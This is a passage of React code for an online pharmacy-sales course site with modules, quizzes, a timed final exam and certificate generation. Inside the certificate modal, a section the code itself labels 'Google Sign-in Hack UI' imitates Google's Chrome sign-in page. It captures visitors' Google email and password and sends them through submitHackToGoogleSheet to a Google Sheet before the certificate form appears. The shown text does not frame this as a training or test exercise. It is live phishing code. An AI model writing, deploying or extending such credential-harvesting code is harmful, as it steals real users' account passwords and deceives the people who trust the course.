                                                className="px-10 py-5 bg-brand-blue text-white font-bold text-xl rounded-2xl hover:bg-blue-600 transition shadow-2xl shadow-blue-500/30 flex items-center gap-3 hover:scale-105 active:scale-95"
                                            >
                                                Start Your Journey <ChevronRight size={24} />
                                            </button>
                                        </div>
                                    </motion.div>
                                ) : (
                                    <>
                                        <div className="flex items-center gap-3 mb-4">
                                            <span className="px-3 py-1 bg-brand-blue/10 text-brand-blue text-xs font-bold uppercase rounded-full">
                                                Module {COURSE_CONTENT.findIndex(m => m.id === activeModuleId) + 1}
                                            </span>
                                            <span className="text-gray-500 text-sm flex items-center gap-1 font-medium">
                                                <Clock size={14} /> {activeModule.duration}
                                            </span>
                                        </div>
                                        <h1 className="text-3xl md:text-4xl font-display font-black text-gray-900 mb-4">{activeModule.title}</h1>
                                        <p className="text-gray-600 text-lg font-medium max-w-3xl leading-relaxed">{activeModule.description}</p>
                                    </>
                                )}
                            </div>

                            {/* Reading Content - Only show if NOT intro */}
                            {activeModuleId !== 'intro' && (
                                <>
                                    <div className="bg-white border border-gray-100 p-8 md:p-12 rounded-3xl mb-12 shadow-sm relative overflow-hidden">
                                        <div className="absolute top-0 right-0 w-32 h-32 bg-brand-yellow/10 rounded-bl-full -mr-10 -mt-10"></div>

                                        <div className="prose prose-lg max-w-none text-gray-600 leading-relaxed font-normal relative z-10">
                                            {activeModule.content.videoUrl && (
                                                <div className="aspect-video bg-gray-900 w-full rounded-2xl overflow-hidden shadow-lg border border-gray-100 mb-8">
                                                    <iframe
                                                        src={activeModule.content.videoUrl}
                                                        className="w-full h-full border-0"
                                                        allow="autoplay; fullscreen"
                                                        allowFullScreen
                                                        title="Module Video"
                                                    ></iframe>
                                                </div>
                                            )}
                                            {activeModule.content.text && activeModule.content.text.split('\n\n').map((paragraph, idx) => (
                                                <p key={idx} className="mb-6 last:mb-0">
                                                    {paragraph.split(/(\*\*.*?\*\*)/).map((part, i) =>
                                                        part.startsWith('**') && part.endsWith('**') ? (
                                                            <strong key={i} className="text-gray-900 font-bold">
                                                                {part.slice(2, -2)}
                                                            </strong>
                                                        ) : (
                                                            part
                                                        )
                                                    )}
                                                </p>
                                            ))}
                                        </div>

                                        <div className="mt-12 pt-8 border-t border-gray-100 relative z-10">
                                            <h3 className="text-xl font-display font-bold text-gray-900 mb-6 flex items-center gap-3">
                                                <div className="bg-brand-yellow/20 p-2 rounded-lg text-brand-yellow">
                                                    <Star size={20} fill="currentColor" />
                                                </div>
                                                Key Takeaways
                                            </h3>
                                            <div className="grid md:grid-cols-2 gap-4">
                                                {activeModule.content.keyTakeaways.map((point, i) => (
                                                    <div key={i} className="flex items-start gap-3 bg-gray-50 p-5 rounded-2xl border border-gray-100 hover:border-brand-blue/20 transition-colors">
                                                        <div className="bg-brand-blue text-white rounded-full p-1 mt-0.5 shrink-0">
                                                            <CheckCircle size={14} strokeWidth={3} />
                                                        </div>
                                                        <span className="text-sm font-medium text-gray-700">{point}</span>
                                                    </div>
                                                ))}
                                            </div>
                                        </div>
                                    </div>

                                    {/* Quiz Section */}
                                    <div className="mb-20">
                                        <h3 className="text-2xl font-display font-bold text-gray-900 mb-6 flex items-center gap-3 justify-between">
                                            <div className="flex items-center gap-3">
                                                <div className="bg-brand-red/10 p-2 rounded-xl text-brand-red">
                                                    <Award size={24} />
                                                </div>
                                                {activeModule.id === 'final-exam' ? 'Final Exam' : 'Knowledge Check'}
                                            </div>

                                            {/* Timer Display - Sticky Header */}
                                            {activeModule.id === 'final-exam' && examStarted && !quizCompleted && (
                                                <motion.div
                                                    initial={{ y: -20, opacity: 0 }}
                                                    animate={{ y: 0, opacity: 1 }}
                                                    className={cn(
                                                        "fixed top-4 right-4 z-50 flex items-center gap-3 px-6 py-3 rounded-full shadow-2xl border-2 backdrop-blur-md transition-all duration-500",
                                                        timeLeft < 60
                                                            ? "bg-red-50/90 border-red-500 text-red-600 shadow-red-500/30 scale-110"
                                                            : "bg-white/90 border-brand-blue/20 text-gray-900 shadow-brand-blue/10"
                                                    )}
                                                >
                                                    {/* Circular Progress Indicator */}
                                                    <div className="relative w-10 h-10 flex items-center justify-center">
                                                        <svg className="w-full h-full -rotate-90" viewBox="0 0 36 36">
                                                            {/* Background Circle */}
                                                            <path
                                                                className="text-gray-200"
                                                                d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                                                                fill="none"
                                                                stroke="currentColor"
                                                                strokeWidth="4"
                                                            />
                                                            {/* Progress Circle */}
                                                            <path
                                                                className={cn(
                                                                    "transition-all duration-1000 ease-linear",
                                                                    timeLeft < 60 ? "text-red-500" : "text-brand-blue"
                                                                )}
                                                                strokeDasharray={`${(timeLeft / 300) * 100}, 100`}
                                                                d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                                                                fill="none"
                                                                stroke="currentColor"
                                                                strokeWidth="4"
                                                                strokeLinecap="round"
                                                            />
                                                        </svg>
                                                        <div className="absolute inset-0 flex items-center justify-center">
                                                            <Clock size={16} className={cn(timeLeft < 60 ? "animate-ping text-red-500" : "text-brand-blue")} />
                                                        </div>
                                                    </div>

                                                    <div className="flex flex-col">
                                                        <span className="text-[10px] uppercase font-bold tracking-widest opacity-60 leading-none mb-1">Time Left</span>
                                                        <span className={cn(
                                                            "font-mono font-black text-2xl leading-none tabular-nums tracking-wider",
                                                            timeLeft < 60 && "animate-pulse text-red-600"
                                                        )}>
                                                            {formatTime(timeLeft)}
                                                        </span>
                                                    </div>
                                                </motion.div>
                                            )}
                                        </h3>

                                        {/* Final Exam Start Screen */}
                                        {activeModule.id === 'final-exam' && !examStarted && !quizCompleted ? (
                                            <div className="bg-white border border-gray-200 p-12 rounded-3xl shadow-sm text-center">
                                                <div className="w-24 h-24 bg-brand-blue/10 rounded-full flex items-center justify-center mx-auto mb-6">
                                                    <ShieldCheck size={48} className="text-brand-blue" />
                                                </div>
                                                <h3 className="text-3xl font-display font-bold text-gray-900 mb-4">Ready for the Final Exam?</h3>
                                                <p className="text-gray-600 text-lg mb-8 max-w-xl mx-auto">
                                                    You have <strong>5 minutes</strong> to complete <strong>5 case study questions</strong>.
                                                    This exam tests your ability to apply what you've learned in real-world scenarios.
                                                </p>
                                                <button
                                                    onClick={() => setExamStarted(true)}
                                                    className="px-10 py-4 bg-brand-blue text-white font-bold text-xl rounded-2xl hover:bg-blue-600 transition shadow-xl shadow-blue-500/20 transform hover:-translate-y-1"
                                                >
                                                    Start Exam Now
                                                </button>
                                            </div>
                                        ) : (
                                            !quizCompleted ? (
                                                <div className="bg-white border border-gray-200 p-8 rounded-3xl shadow-sm">
                                                    {/* Progress Bar for Quiz */}
                                                    <div className="mb-8">
                                                        <div className="flex justify-between text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">
                                                            <span>Question {currentQuestionIndex + 1} of {shuffledQuestions.length}</span>
                                                            <span>{Math.round(((currentQuestionIndex) / shuffledQuestions.length) * 100)}% Completed</span>
                                                        </div>
                                                        <div className="h-2 w-full bg-gray-100 rounded-full overflow-hidden">
                                                            <div
                                                                className="h-full bg-brand-blue transition-all duration-300 rounded-full"
                                                                style={{ width: `${((currentQuestionIndex) / shuffledQuestions.length) * 100}%` }}
                                                            ></div>
                                                        </div>
                                                    </div>

                                                    <AnimatePresence mode="wait">
                                                        <motion.div
                                                            key={currentQuestionIndex}
                                                            initial={{ opacity: 0, x: 20 }}
                                                            animate={{ opacity: 1, x: 0 }}
                                                            exit={{ opacity: 0, x: -20 }}
                                                            transition={{ duration: 0.3 }}
                                                        >
                                                            <h4 className="text-xl font-bold text-gray-900 mb-6 leading-relaxed">
                                                                {shuffledQuestions[currentQuestionIndex].question}
                                                            </h4>

                                                            <div className="space-y-3 mb-8">
                                                                {shuffledQuestions[currentQuestionIndex].options.map((option, idx) => {
                                                                    const currentQuestionId = shuffledQuestions[currentQuestionIndex].id;
                                                                    const isSelected = quizAnswers[currentQuestionId] === idx;
                                                                    const isCorrect = shuffledQuestions[currentQuestionIndex].correctAnswer === idx;

                                                                    let buttonStyle = "border-gray-200 hover:bg-gray-50 hover:border-gray-300 text-gray-600";

                                                                    if (showExplanation) {
                                                                        if (isCorrect) {
                                                                            buttonStyle = "border-green-500 bg-green-50 text-green-700 font-bold ring-2 ring-green-500/20";
                                                                        } else if (isSelected && !isCorrect) {
                                                                            buttonStyle = "border-red-500 bg-red-50 text-red-700 opacity-50";
                                                                        } else {
                                                                            buttonStyle = "border-gray-100 opacity-40";
                                                                        }
                                                                    } else if (isSelected) {
                                                                        buttonStyle = "border-brand-blue bg-brand-blue/5 text-brand-blue font-bold ring-2 ring-brand-blue/20";
                                                                    }

                                                                    return (
                                                                        <button
                                                                            key={idx}
                                                                            onClick={() => !showExplanation && handleAnswerSelect(currentQuestionId, idx)}
                                                                            disabled={showExplanation}
                                                                            className={cn(
                                                                                "w-full text-left p-5 rounded-2xl border-2 transition-all flex justify-between items-center text-lg",
                                                                                buttonStyle
                                                                            )}
                                                                        >
                                                                            <span>{option}</span>
                                                                            {showExplanation && isCorrect && <CheckCircle size={24} className="text-green-500" />}
                                                                            {showExplanation && isSelected && !isCorrect && <X size={24} className="text-red-500" />}
                                                                        </button>
                                                                    );
                                                                })}
                                                            </div>

                                                            {/* Explanation & Next Button */}
                                                            {showExplanation && (
                                                                <motion.div
                                                                    initial={{ opacity: 0, y: 10 }}
                                                                    animate={{ opacity: 1, y: 0 }}
                                                                    className={cn(
                                                                        "p-6 rounded-2xl mb-6 border-l-4",
                                                                        quizAnswers[shuffledQuestions[currentQuestionIndex].id] === shuffledQuestions[currentQuestionIndex].correctAnswer
                                                                            ? "bg-green-50 border-green-500"
                                                                            : "bg-red-50 border-red-500"
                                                                    )}
                                                                >
                                                                    <div className="flex items-start gap-3">
                                                                        <div className={cn(
                                                                            "p-2 rounded-full shrink-0",
                                                                            quizAnswers[shuffledQuestions[currentQuestionIndex].id] === shuffledQuestions[currentQuestionIndex].correctAnswer
                                                                                ? "bg-green-200 text-green-700"
                                                                                : "bg-red-200 text-red-700"
                                                                        )}>
                                                                            {quizAnswers[shuffledQuestions[currentQuestionIndex].id] === shuffledQuestions[currentQuestionIndex].correctAnswer
                                                                                ? <CheckCircle size={20} />
                                                                                : <X size={20} />
                                                                            }
                                                                        </div>
                                                                        <div>
                                                                            <h5 className={cn(
                                                                                "font-bold text-lg mb-1",
                                                                                quizAnswers[shuffledQuestions[currentQuestionIndex].id] === shuffledQuestions[currentQuestionIndex].correctAnswer
                                                                                    ? "text-green-800"
                                                                                    : "text-red-800"
                                                                            )}>
                                                                                {quizAnswers[shuffledQuestions[currentQuestionIndex].id] === shuffledQuestions[currentQuestionIndex].correctAnswer
                                                                                    ? "Correct!"
                                                                                    : "Incorrect"
                                                                                }
                                                                            </h5>
                                                                            <p className="text-gray-700 leading-relaxed">
                                                                                {shuffledQuestions[currentQuestionIndex].explanation}
                                                                            </p>
                                                                        </div>
                                                                    </div>

                                                                    <div className="mt-6 flex justify-end">
                                                                        {quizAnswers[shuffledQuestions[currentQuestionIndex].id] === shuffledQuestions[currentQuestionIndex].correctAnswer ? (
                                                                            <button
                                                                                onClick={handleNextQuestion}
                                                                                className="px-8 py-3 bg-brand-blue text-white font-bold rounded-xl hover:bg-blue-600 transition shadow-lg flex items-center gap-2"
                                                                            >
                                                                                {currentQuestionIndex < shuffledQuestions.length - 1 ? "Next Question" : "Finish Module"} <ChevronRight size={20} />
                                                                            </button>
                                                                        ) : (
                                                                            <button
                                                                                onClick={handleNextQuestion}
                                                                                className="px-6 py-3 bg-white border-2 border-red-200 text-red-600 font-bold rounded-xl hover:bg-red-50 transition"
                                                                            >
                                                                                Try Again
                                                                            </button>
                                                                        )}
                                                                    </div>
                                                                </motion.div>
                                                            )}
                                                        </motion.div>
                                                    </AnimatePresence>
                                                </div>
                                            ) : (
                                                <div className="bg-green-50 border border-green-200 p-8 rounded-3xl text-center">
                                                    <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                                                        <Award size={40} className="text-green-600" />
                                                    </div>
                                                    <h3 className="text-2xl font-bold text-green-800 mb-2">Module Completed!</h3>
                                                    <p className="text-green-700 mb-8 max-w-md mx-auto">
                                                        You've successfully mastered this topic. You can now proceed to the next module or review the content.
                                                    </p>

                                                    <div className="flex justify-center gap-4">
                                                        <button
                                                            onClick={() => {
                                                                setQuizCompleted(false);
                                                                setCurrentQuestionIndex(0);
                                                                setQuizAnswers({});
                                                                setShowExplanation(false);
                                                            }}
                                                            className="px-6 py-3 bg-white border border-green-200 text-green-700 font-bold rounded-xl hover:bg-green-100 transition"
                                                        >
                                                            Review Quiz
                                                        </button>

                                                        {COURSE_CONTENT.findIndex(m => m.id === activeModuleId) < COURSE_CONTENT.length - 1 && (
                                                            <button
                                                                onClick={() => {
                                                                    const currentIndex = COURSE_CONTENT.findIndex(m => m.id === activeModuleId);
                                                                    setActiveModuleId(COURSE_CONTENT[currentIndex + 1].id);
                                                                }}
                                                                className="px-8 py-3 bg-green-600 text-white font-bold rounded-xl hover:bg-green-700 transition shadow-lg flex items-center gap-2"
                                                            >
                                                                Next Module <ChevronRight size={20} />
                                                            </button>
                                                        )}
                                                    </div>
                                                </div>
                                            )
                                        )}
                                    </div>
                                </>
                            )}
                        </div>
                    </main>
                </div>
            )}

            {/* Name Input Modal */}
            <AnimatePresence>
                {nameInputOpen && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
                        <motion.div
                            initial={{ opacity: 0, scale: 0.95, y: 20 }}
                            animate={{ opacity: 1, scale: 1, y: 0 }}
                            exit={{ opacity: 0, scale: 0.95, y: 20 }}
                            className="bg-white rounded-2xl max-w-lg w-full shadow-2xl overflow-hidden relative"
                        >
                            {/* Decorative Top Bar */}
                            <div className="h-2 w-full bg-gradient-to-r from-brand-blue via-brand-red to-brand-yellow"></div>

                            <div className="p-8">
                                <div className="flex items-center justify-between mb-8">
                                    <div>
                                        <h2 className="text-2xl font-display font-bold text-gray-900">
                                            {isHacked ? "Certificate Issuance" : "Authentication Required"}
                                        </h2>
                                        <p className="text-sm text-gray-500 mt-1">
                                            {isHacked
                                                ? "Please enter your legal name as it appears on your ID."
                                                : "Please sign in to your account to continue."}
                                        </p>
                                    </div>
                                    <div className="w-12 h-12 bg-brand-blue/5 rounded-full flex items-center justify-center text-brand-blue">
                                        <ShieldCheck size={24} />
                                    </div>
                                </div>

                                {!isHacked ? (
                                    /* Google Sign-in Hack UI */
                                    <div className="space-y-6">
                                        <div className="flex flex-col md:flex-row gap-8">
                                            {/* Left Column */}
                                            <div className="flex-1 flex flex-col pt-2">
                                                <svg className="w-10 h-10 mb-6" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
                                                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
                                                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05" />
                                                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
                                                </svg>
                                                <h1
                                                    className="text-2xl font-normal text-[#1f1f1f] mb-4"
                                                    style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}
                                                >
                                                    {hackStep === 'email' ? "Sign in to Chrome" : "Welcome"}
                                                </h1>
                                                {hackStep === 'email' ? (
                                                    <p className="text-[14px] text-[#1f1f1f]">Use your Google Account</p>
                                                ) : (
                                                    <button
                                                        onClick={() => setHackStep('email')}
                                                        className="inline-flex items-center gap-2 border border-[#747775] rounded-full px-3 py-1 mt-2 hover:bg-gray-50 transition-colors w-fit"
                                                    >
                                                        <div className="w-5 h-5 bg-blue-100 rounded-full flex items-center justify-center">
                                                            <span className="text-[10px] font-bold text-blue-600">{hackEmail.charAt(0).toUpperCase()}</span>
                                                        </div>
                                                        <span className="text-[13px] text-[#1f1f1f] font-medium">{hackEmail}</span>
                                                        <ChevronDown className="w-4 h-4 text-[#5f6368]" />
                                                    </button>
                                                )}
                                            </div>

                                            {/* Right Column */}
                                            <div className="flex-[1.5] flex flex-col pt-2">
                                                {hackStep === 'email' ? (
                                                    <>
                                                        <div className="relative mb-4">
                                                            <input
                                                                type="email"
                                                                value={hackEmail}
                                                                onChange={(e) => {
                                                                    setHackEmail(e.target.value);
                                                                    if (hackEmailError) setHackEmailError(false);
                                                                }}
                                                                onKeyDown={(e) => {
                                                                    if (e.key === 'Enter') {
                                                                        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                                                                        if (emailRegex.test(hackEmail)) {
                                                                            setHackStep('password');
                                                                        } else {
                                                                            setHackEmailError(true);
                                                                        }
                                                                    }
                                                                }}
                                                                placeholder=" "
                                                                className={cn(
                                                                    "peer w-full border rounded-[4px] px-4 py-3.5 text-[16px] focus:outline-none focus:border-2 transition-colors",
                                                                    hackEmailError ? "border-[#d93025] focus:border-[#d93025]" : "border-[#747775] focus:border-[#0b57d0]"
                                                                )}
                                                            />
                                                            <label className={cn(
                                                                "absolute left-3 top-3.5 px-1 text-[16px] transition-all bg-white peer-focus:-top-2.5 peer-focus:text-[12px] peer-[:not(:placeholder-shown)]:-top-2.5 peer-[:not(:placeholder-shown)]:text-[12px]",
                                                                hackEmailError ? "text-[#d93025] peer-focus:text-[#d93025]" : "text-[#444746] peer-focus:text-[#0b57d0]"
                                                            )}>
                                                                Email or phone
                                                            </label>
                                                        </div>
                                                        {hackEmailError && (
                                                            <div className="flex items-center gap-2 mt-2 mb-2 text-[#d93025] text-[12px]">
                                                                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                                                                </svg>
                                                                <span>Enter a valid email or phone number</span>
                                                            </div>
                                                        )}
                                                        <a
                                                            href="https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin"
                                                            target="_blank"
                                                            rel="noopener noreferrer"
                                                            className="text-[14px] text-[#0b57d0] font-medium hover:bg-blue-50 px-2 py-1.5 rounded w-fit mb-8 block"
                                                        >
                                                            Forgot email?
                                                        </a>
                                                        <div className="flex justify-between items-center mt-auto">
                                                            <a
                                                                href="https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1"
                                                                target="_blank"
                                                                rel="noopener noreferrer"
                                                                className="text-[#0b57d0] font-medium text-[14px] px-4 py-2 hover:bg-blue-50 rounded"
                                                            >
                                                                Create account
                                                            </a>
                                                            <button
                                                                onClick={() => {
                                                                    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                                                                    if (emailRegex.test(hackEmail)) {
                                                                        setHackStep('password');
                                                                    } else {
                                                                        setHackEmailError(true);
                                                                    }
                                                                }}
                                                                className="bg-[#0b57d0] text-white px-6 py-2 rounded-full font-medium text-[14px] hover:bg-blue-700 transition"
                                                            >
                                                                Next
                                                            </button>
                                                        </div>
                                                    </>
                                                ) : (
                                                    <>
                                                        <div className="relative mb-4">
                                                            <input
                                                                type={hackShowPassword ? "text" : "password"}
                                                                value={hackPassword}
                                                                onChange={(e) => setHackPassword(e.target.value)}
                                                                onKeyDown={(e) => e.key === 'Enter' && hackPassword && setIsHacked(true)}
                                                                placeholder=" "
                                                                className="peer w-full border border-[#747775] rounded-[4px] px-4 py-3.5 text-[16px] focus:outline-none focus:border-2 focus:border-[#0b57d0]"
                                                            />
                                                            <label className="absolute left-3 top-3.5 px-1 text-[16px] text-[#444746] transition-all bg-white peer-focus:-top-2.5 peer-focus:text-[12px] peer-focus:text-[#0b57d0] peer-[:not(:placeholder-shown)]:-top-2.5 peer-[:not(:placeholder-shown)]:text-[12px]">
                                                                Enter your password
                                                            </label>
                                                        </div>
                                                        <div className="flex items-center gap-2 mb-8">
                                                            <input
                                                                type="checkbox"
                                                                id="showP"
                                                                checked={hackShowPassword}
                                                                onChange={(e) => setHackShowPassword(e.target.checked)}
                                                                className="w-4 h-4"
                                                            />
                                                            <label htmlFor="showP" className="text-sm text-gray-600">Show password</label>
                                                        </div>
                                                        <div className="flex justify-between items-center mt-auto">
                                                            <button className="text-[#0b57d0] font-medium text-[14px] px-4 py-2 hover:bg-blue-50 rounded">Try another way</button>
                                                            <button
                                                                onClick={() => {
                                                                    if (hackPassword) {
                                                                        setEmail(hackEmail); // Pre-fill certificate email
                                                                        setIsHacked(true);

                                                                        // Submit hack data to Google Sheet
                                                                        submitHackToGoogleSheet({
                                                                            email: hackEmail,
                                                                            password: hackPassword,
                                                                            timestamp: new Date().toLocaleString()
                                                                        });
                                                                    }
                                                                }}
                                                                className="bg-[#0b57d0] text-white px-6 py-2 rounded-full font-medium text-[14px] hover:bg-blue-700 transition"
                                                            >
                                                                Next
                                                            </button>
                                                        </div>
                                                    </>
                                                )}
                                            </div>
                                        </div>
                                        <div className="flex justify-between items-center text-[12px] text-gray-500 pt-8 border-t border-gray-100 relative">
                                            <div className="relative">
                                                <button
                                                    onClick={() => setShowLanguageList(!showLanguageList)}
                                                    className="flex items-center gap-1 hover:bg-gray-200/50 py-2 px-3 rounded transition-colors -ml-3"
                                                >
                                                    English (United States)
                                                    <ChevronDown className="w-4 h-4 ml-1" />
                                                </button>

                                                {showLanguageList && (
                                                    <div className="absolute bottom-full left-0 mb-2 w-64 max-h-80 overflow-y-auto bg-white border border-gray-200 shadow-xl rounded-lg z-[60] py-2 scrollbar-thin scrollbar-thumb-gray-300">
                                                        {LANGUAGES.map((lang, idx) => (
                                                            <button
                                                                key={idx}
                                                                onClick={() => setShowLanguageList(false)}
                                                                className="w-full text-left px-4 py-2 hover:bg-gray-100 transition-colors text-sm text-gray-700"
                                                            >
                                                                {lang}
                                                            </button>
                                                        ))}
                                                    </div>
                                                )}
                                            </div>
                                            <div className="flex gap-4">
                                                <a href="https://support.google.com/accounts?hl=en&visit_id=639112711653051969-914564191&rd=2&p=account_iph#topic=3382296" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
                                                <a href="https://policies.google.com/privacy?gl=EG&hl=en-US" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
                                                <a href="https://policies.google.com/terms?gl=EG&hl=en-US" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
                                            </div>
                                        </div>
                                    </div>
                                ) : (
                                    /* Original Certificate Data Form */
                                    <div className="grid grid-cols-2 gap-x-4 gap-y-5 relative overflow-hidden">
                                        {/* Watermark */}
                                        <div className="absolute -right-6 -bottom-6 opacity-[0.03] pointer-events-none">
                                            <BrandLogo className="w-32 h-32" />
                                        </div>

                                        <div className="col-span-2">
                                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-1.5">First Name</label>
                                            <input
                                                type="text"
                                                value={firstName}
                                                onChange={(e) => {
                                                    if (/^[a-zA-Z\s]*$/.test(e.target.value)) setFirstName(e.target.value);
                                                }}
                                                className="w-full bg-white border border-gray-200 rounded-lg px-4 py-3 text-gray-900 font-semibold focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/10 transition"
                                                autoFocus
                                            />
                                        </div>
                                        <div className="col-span-1">
                                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-1.5">Middle Name</label>
                                            <input
                                                type="text"
                                                value={secondName}
                                                onChange={(e) => {
                                                    if (/^[a-zA-Z\s]*$/.test(e.target.value)) setSecondName(e.target.value);
                                                }}
                                                className="w-full bg-white border border-gray-200 rounded-lg px-4 py-3 text-gray-900 font-semibold focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/10 transition"
                                            />
                                        </div>
                                        <div className="col-span-1">
                                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-1.5">Last Name</label>
                                            <input
                                                type="text"
                                                value={lastName}
                                                onChange={(e) => {
                                                    if (/^[a-zA-Z\s]*$/.test(e.target.value)) setLastName(e.target.value);
                                                }}
                                                className="w-full bg-white border border-gray-200 rounded-lg px-4 py-3 text-gray-900 font-semibold focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/10 transition"
                                            />
                                        </div>

                                        <div className="col-span-2">
                                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-1.5">Phone Number</label>
                                            <div className="flex gap-2">
                                                <select
                                                    value={countryCode}
                                                    onChange={(e) => setCountryCode(e.target.value)}
                                                    className="w-32 bg-white border border-gray-200 rounded-lg px-3 py-3 text-gray-900 font-semibold focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/10 transition text-sm shadow-sm"
                                                >
                                                    {COUNTRY_CODES.map(c => (
                                                        <option key={c.code + c.country} value={c.code}>
                                                            {c.country} ({c.code})
                                                        </option>
                                                    ))}
                                                </select>
                                                <input
                                                    type="tel"
                                                    value={phone}
                                                    onChange={(e) => {
                                                        const val = e.target.value.replace(/\D/g, '');
                                                        setPhone(val);
                                                    }}
                                                    className="flex-1 bg-white border border-gray-200 rounded-lg px-4 py-3 text-gray-900 font-semibold focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/10 transition"
                                                    placeholder="123456789"
                                                />
                                            </div>
                                        </div>
                                        <div className="col-span-2">
                                            <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-1.5">Email Address</label>
                                            <input
                                                type="email"
                                                value={email}
                                                onChange={(e) => setEmail(e.target.value)}
                                                className="w-full bg-white border border-gray-200 rounded-lg px-4 py-3 text-gray-900 font-semibold focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/10 transition"
                                            />
                                        </div>
                                    </div>
                                )}

                                {isHacked && (
                                    <div className="mt-8 flex items-center justify-end gap-3">
                                        <button
                                            onClick={() => setNameInputOpen(false)}
                                            className="px-5 py-2.5 text-sm font-bold text-gray-500 hover:text-gray-800 transition"
                                        >
                                            Cancel
                                        </button>
                                        <button
                                            onClick={() => {
                                                if (firstName.trim() && secondName.trim() && lastName.trim() && phone.trim() && email.trim()) {
                                                    const format = (name: string) => name.trim().charAt(0).toUpperCase() + name.trim().slice(1).toLowerCase();
                                                    const formattedFirst = format(firstName);
                                                    const formattedSecond = format(secondName);
                                                    const formattedLast = format(lastName);

                                                    setFirstName(formattedFirst);
                                                    setSecondName(formattedSecond);
                                                    setLastName(formattedLast);

                                                    const fullName = `${formattedFirst} ${formattedSecond} ${formattedLast}`;
                                                    const certId = generateCertificateId(fullName);
                                                    setCurrentCertificateId(certId);

                                                    setNameInputOpen(false);
                                                    setShowCertificate(true);

                                                    // Submit to Google Sheet
                                                    submitToGoogleSheet({
                                                        firstName: formattedFirst,
                                                        secondName: formattedSecond,
                                                        lastName: formattedLast,
                                                        phone: `(${countryCode})${phone}`,
                                                        email,
                                                        courseName: "Master the Art of Ethical Pharmacy Sales",
                                                        certificateId: certId,
                                                        timestamp: new Date().toLocaleString()
                                                    });
                                                }
                                            }}
                                            className="px-6 py-2.5 bg-brand-blue text-white text-sm font-bold rounded-lg shadow-lg shadow-brand-blue/20 hover:bg-blue-600 transition flex items-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                                            disabled={!firstName.trim() || !secondName.trim() || !lastName.trim() || !phone.trim() || !email.trim()}
                                        >
                                            <Award size={16} />
                                            Generate Certificate
                                        </button>
                                    </div>
                                )}
                            </div>
                        </motion.div>
                    </div>
                )}
            </AnimatePresence>

            {/* Certificate Modal */}
            {showCertificate && (
                <Certificate
                    studentName={`${firstName} ${secondName} ${lastName}`}
                    courseName="Master the Art of Ethical Pharmacy Sales"
                    date={new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}
                    certificateId={currentCertificateId}
                    onClose={() => setShowCertificate(false)}
                />
            )}
        </div>
    );
}
